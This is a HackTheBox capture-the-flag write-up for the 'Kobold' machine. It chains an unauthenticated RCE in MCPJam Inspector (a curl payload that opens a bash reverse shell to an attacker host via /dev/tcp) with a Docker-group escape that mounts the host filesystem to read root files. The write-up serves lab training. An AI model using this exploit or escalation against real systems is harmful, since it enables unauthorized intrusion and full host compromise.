# HTB Writeup — Kobold

- **IP:** `10.129.24.252`
- **Domain:** `kobold.htb`
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Subdomain Discovery](#2-subdomain-discovery)
3. [MCPJam Inspector — Unauthenticated RCE](#3-mcpjam-inspector--unauthenticated-rce)
4. [Reverse Shell & User Flag](#4-reverse-shell--user-flag)
5. [Privilege Escalation via Docker Group](#5-privilege-escalation-via-docker-group)
6. [Root Flag](#6-root-flag)

---

## 1. Enumeration

### Adding the Host

```bash
echo "10.129.24.252 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.129.24.252
```

**Results:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
80/tcp   open  http     nginx 1.24.0 (redirects to https://kobold.htb/)
443/tcp  open  ssl/http nginx 1.24.0
3552/tcp open  http     Golang net/http server (Arcane Docker Management)
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | Redirects to HTTPS |
| 443/tcp | HTTPS | Main site |
| 3552/tcp | HTTP | Arcane Docker Management dashboard |

Port 3552 stands out immediately — it runs the Arcane Docker Management panel, a modern container management tool that exposes a rich API.

---

## 2. Subdomain Discovery

Navigating to `https://kobold.htb:3552` reveals the Arcane dashboard. Enumerating subdomains uncovers two additional vhosts:

- `mcp.kobold.htb` — MCPJam Inspector (a local-first development platform for MCP servers)
- `bin.kobold.htb` — PrivateBin instance

Confirm the API is reachable:

```bash
curl -sk http://mcp.kobold.htb:3552/api/openapi.json
```

The OpenAPI spec confirms a large attack surface including container management, template, and user endpoints.

---

## 3. MCPJam Inspector — Unauthenticated RCE

### Vulnerability

The `/api/mcp/connect` endpoint on `https://mcp.kobold.htb` is vulnerable to **unauthenticated remote code execution (GHSA-232v-j27c-5pp6)**. It accepts a `serverConfig.command` parameter without sanitization, allowing arbitrary command execution.

### Verifying the Endpoint

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{}'
```

Response:
```json
{"success":false,"error":"serverConfig is required"}
```

The endpoint exists and responds without authentication.

### Crafting the Payload

Start a listener:

```bash
nc -lvnp 4444
```

Send the reverse shell payload:

```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"]}}'
```

---

## 4. Reverse Shell & User Flag

A shell arrives as user `ben`:

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The landing directory is `/usr/local/lib/node_modules/@mcpjam/inspector`.

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieve the user flag:

```bash
cat /home/ben/user.txt
```

```
flag
```

---

## 5. Privilege Escalation via Docker Group

### Identifying the Vector

Checking group membership reveals `ben` is in the `operator` group:

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

The `operator` group is configured to allow switching into the `docker` group:

```bash
newgrp docker
docker images
```

**Available images:**

```
REPOSITORY                    TAG       IMAGE ID
mysql                         latest    f66b7a288113
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
```

### Docker Socket Abuse

Membership in the `docker` group grants effective root-level access to the host by mounting the host filesystem into a container.

```bash
docker run --rm -u root \
  -v /:/hostfs \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
  -c "cat /hostfs/root/root.txt"
```

The container runs as root and has unrestricted read access to the host's filesystem via `/hostfs`.

---

## 6. Root Flag

```bash
docker run --rm -u root \
  -v /:/hostfs \
  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \
  -c "cat /hostfs/root/root.txt"
```

```
flag
```

---

## Attack Chain Summary

```
Nmap scan → ports 22, 80, 443, 3552
        ↓
Add /etc/hosts entries → kobold.htb, mcp.kobold.htb, bin.kobold.htb
        ↓
Discover MCPJam Inspector at https://mcp.kobold.htb
        ↓
Unauthenticated RCE via /api/mcp/connect (GHSA-232v-j27c-5pp6)
→ serverConfig.command executes arbitrary bash
→ reverse shell as ben
        ↓
ben is member of operator group
→ newgrp docker → gain docker group access
        ↓
Docker socket abuse → mount host / into container
→ run as root inside container
→ read /hostfs/root/root.txt
        ↓
Root flag captured
```

---

*Writeup written post-retirement in accordance with HackTheBox guidelines.*
